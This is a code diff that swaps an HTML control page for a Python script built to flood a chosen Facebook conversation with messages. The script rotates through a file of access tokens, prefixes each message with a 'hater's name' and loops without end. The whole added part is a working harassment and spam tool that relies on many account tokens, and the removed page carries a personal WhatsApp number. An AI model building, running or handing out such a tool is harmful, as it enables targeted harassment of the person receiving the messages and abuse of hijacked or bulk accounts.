@@ -1,122 +1,80 @@
+import requests
+import time
+import random
+import os
+from colorama import init, Fore
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>J4LL4D CONVO</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-  <style>
-    /* CSS for styling elements */
-    label { color: white; }
-    .file { height: 30px; }
-    body {
-      background-image: url('https://i.imgur.com/f1tLj6T.jpeg');
-      background-size: cover;
-      background-repeat: no-repeat;
-      color: white;
+init(autoreset=True)
+
+def approval():
+    os.system('clear')
+    uuid = str(os.geteuid()) + str(os.getlogin())
+    id = "-".join(uuid)   
+
+def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
+    with open(messages_file, "r") as file:
+        messages = file.readlines()
+    with open(tokens_file, "r") as file:
+        tokens = file.readlines()
+
+    headers = {
+        "Connection": "keep-alive",
+        "Cache-Control": "max-age=0",
+        "Upgrade-Insecure-Requests": "1",
+        "User-Agent": ("Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) "
+                       "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36"),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate",
+        "Accept-Language": "en-US,en;q=0.9,fr;q=0.8",
+        "Referer": "www.google.com",
     }
-    .container {
-      max-width: 350px;
-      height: auto;
-      border-radius: 20px;
-      padding: 20px;
-      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
-      box-shadow: 0 0 15px white;
-      border: none;
-      resize: none;
-    }
-    .form-control {
-      outline: 1px red;
-      border: 1px double white;
-      background: transparent;
-      width: 100%;
-      height: 40px;
-      padding: 7px;
-      margin-bottom: 20px;
-      border-radius: 10px;
-      color: none;
-    }
-    .header { text-align: center; padding-bottom: 20px; }
-    .btn-submit { width: 100%; margin-top: 10px; }
-    .footer { text-align: center; margin-top: 20px; color: #888; }
-    .whatsapp-link {
-      display: inline-block;
-      color: #25d366;
-      text-decoration: none;
-      margin-top: 10px;
-    }
-    .whatsapp-link i { margin-right: 5px; }
-  </style>
-</head>
-<body>
-  <header class="header mt-4">
-    <h1 class="mt-3">J4LL4D MULTI CONVO</h1>
-  </header>
-  <div class="container text-center">
-    <form method="post" enctype="multipart/form-data">
-      <div class="mb-3">
-        <label for="tokenOption" class="form-label">Select Token Option</label>
-        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
-          <option value="single">Single Token</option>
-          <option value="multiple">Token File</option>
-        </select>
-      </div>
-      <div class="mb-3" id="singleTokenInput">
-        <label for="singleToken" class="form-label">Enter Single Token</label>
-        <input type="text" class="form-control" id="singleToken" name="singleToken">
-      </div>
-      <div class="mb-3" id="tokenFileInput" style="display: none;">
-        <label for="tokenFile" class="form-label">Choose Token File</label>
-        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
-      </div>
-      <div class="mb-3">
-        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
-        <input type="text" class="form-control" id="threadId" name="threadId" required>
-      </div>
-      <div class="mb-3">
-        <label for="kidx" class="form-label">Enter Your Hater Name</label>
-        <input type="text" class="form-control" id="kidx" name="kidx" required>
-      </div>
-      <div class="mb-3">
-        <label for="time" class="form-label">Enter Time (seconds)</label>
-        <input type="number" class="form-control" id="time" name="time" required>
-      </div>
-      <div class="mb-3">
-        <label for="txtFile" class="form-label">Choose Your Np File</label>
-        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
-      </div>
-      <button type="submit" class="btn btn-primary btn-submit">Run</button>
-    </form>
-    <form method="post" action="/stop">
-      <div class="mb-3">
-        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
-        <input type="text" class="form-control" id="taskId" name="taskId" required>
-      </div>
-      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
-    </form>
-  </div>
-  <footer class="footer">
-    <p>Â© 2023 CODED BY :- J4LL4D HERE</p>
-    <p> FUKING MASTER J4LL4D HERE</a></p>
-    <div class="mb-3">
-      <a href="https://wa.me/+918368004462" class="whatsapp-link">
-        <i class="fab fa-whatsapp"></i> Chat on WhatsApp
-      </a>
-    </div>
-  </footer>
-  <script>
-    function toggleTokenInput() {
-      var tokenOption = document.getElementById('tokenOption').value;
-      if (tokenOption == 'single') {
-        document.getElementById('singleTokenInput').style.display = 'block';
-        document.getElementById('tokenFileInput').style.display = 'none';
-      } else {
-        document.getElementById('singleTokenInput').style.display = 'none';
-        document.getElementById('tokenFileInput').style.display = 'block';
-      }
-    }
-  </script>
-</body>
-</html>
+
+    logos = [
+        r'''
+██╗████████╗██╗  ██╗    ███╗   ███╗██╗  ██╗
+██║╚══██╔══╝╚██╗██╔╝    ████╗ ████║██║ ██╔╝
+██║   ██║    ╚███╔╝     ██╔████╔██║█████╔╝ 
+██║   ██║    ██╔██╗     ██║╚██╔╝██║██╔═██╗ 
+██║   ██║   ██╔╝ ██╗    ██║ ╚═╝ ██║██║  ██╗
+╚═╝   ╚═╝   ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═╝  ╚═╝
+'''
+    ]
+
+    while True:
+        for message_index, message in enumerate(messages):
+            token_index = message_index % len(tokens)
+            access_token = tokens[token_index].strip()
+            full_message = f"{haters_name} {message.strip()}"
+
+            url = f"https://graph.facebook.com/v17.0/t_{target_id}"
+            parameters = {"access_token": access_token, "message": full_message}
+            try:
+                response = requests.post(url, json=parameters, headers=headers)
+                response.raise_for_status()
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                current_logo = random.choice(logos)
+                print(Fore.GREEN + current_logo)
+                print(Fore.GREEN + f"[+]  ITX MK H3R3 {message_index + 1} S3NT TO C0NV0 {target_id} W1TH TOK3N {token_index + 1}: {full_message} at {current_time}")
+            except requests.exceptions.RequestException as e:
+                print(Fore.RED + f"[x] F91L3D TO S3ND M3SS3G3  {message_index + 1} T0 C0NV0 {target_id} W1TH TOK3N {token_index + 1}: {full_message} - Error: {e}")
+
+            time.sleep(speed)
+        print(Fore.CYAN + "\n[+] All messages sent. Restarting the process...\n")
+
+def main():
+    approval()
+    
+    print(Fore.MAGENTA + " ITX.MK.H3R3 ")
+    print(Fore.CYAN + "------------------------------------")
+    # Get file paths and other inputs from the user
+    tokens_file = input(Fore.MAGENTA + "Enter the path to the tokens file: ").strip()
+    target_id = input(Fore.MAGENTA + "Enter the target_id: ").strip()
+    messages_file = input(Fore.MAGENTA + "Enter the path to the messages file: ").strip()
+    haters_name = input(Fore.MAGENTA + "Enter the hater's name: ").strip()
+    speed = float(input(Fore.MAGENTA + "Enter the speed (in seconds) between messages: ").strip())
+
+    # Start sending messages
+    send_messages(tokens_file, target_id, messages_file, haters_name, speed)
+
+if __name__ == "__main__":
+    main()
